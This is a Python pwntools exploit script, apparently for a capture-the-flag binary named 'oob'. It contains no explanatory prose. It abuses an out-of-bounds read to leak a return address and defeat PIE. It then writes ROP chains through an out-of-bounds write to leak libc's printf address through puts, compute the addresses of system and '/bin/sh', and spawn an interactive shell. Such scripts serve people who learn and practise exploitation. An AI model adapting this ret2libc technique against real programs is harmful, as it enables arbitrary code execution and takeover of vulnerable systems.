from pwn import *

p = process('./oob')
e = ELF('./oob')

def isi(i, ch):
	p.sendline('i')
	p.sendline(str(i))
	p.sendline(ch)
	p.recvuntil('filled\n')

def baca(i):
	p.sendline('r')
	p.sendline(str(i))
	p.recvuntil('is ')
	leaked = chr(eval(p.recvline()[:-1]) & 0xff) # Get two last hex
	return leaked

saved_rip_addr 	= 0x7fffffffdcc8
buff_addr	 	= 0x7fffffffdcae
offset_rip		= 0x8ae		# LOOK AT GDB 3 last rip hex
base_pie		= ''
distance		= saved_rip_addr - buff_addr

print 'distance =',distance

for i in range(distance, distance+8):
	base_pie += baca(i)

print base_pie
base_pie = u64(base_pie)
base_pie -= offset_rip

log.info("Base PIE\t: 0x{0:x}".format(base_pie))


gotprintf = p64(e.got['printf'] + base_pie)
puts = p64(e.symbols['puts'] + base_pie)
main = p64(e.symbols['main'] + base_pie)
poprdi = p64(0x0000000000000923 + base_pie)
poprsir15 = p64(0x0000000000000921 + base_pie)
payload = poprdi + gotprintf + puts + main # Leak Libc printf address

log.info('Leaking libc')
print 'payload = '+repr(payload)
for i,pp in enumerate(payload):
	isi(i+distance, pp)


# Get Libc printf address
p.sendline('x')
printf = p.recvline()
printf_addr =  u64(printf[:-1]+'\x00\x00')

log.info('Printf libc\t: 0x{0:x}'.format(printf_addr))

# OFFSETS nm -D /lib/x86_64-linux-gnu/libc.so.6
offset_system =	0x04f440
offset_printf = 0x064e80
offset_binsh  = 0x1b3e9a

libc_base = printf_addr - offset_printf
system_addr = libc_base + offset_system
binsh_addr = libc_base + offset_binsh

# Gaining shell
payload = poprdi + p64(binsh_addr) + p64(system_addr)

log.info('Gaining shell')

for i,pp in enumerate(payload):
	isi(i+distance, pp)

p.sendline('x')
p.interactive()

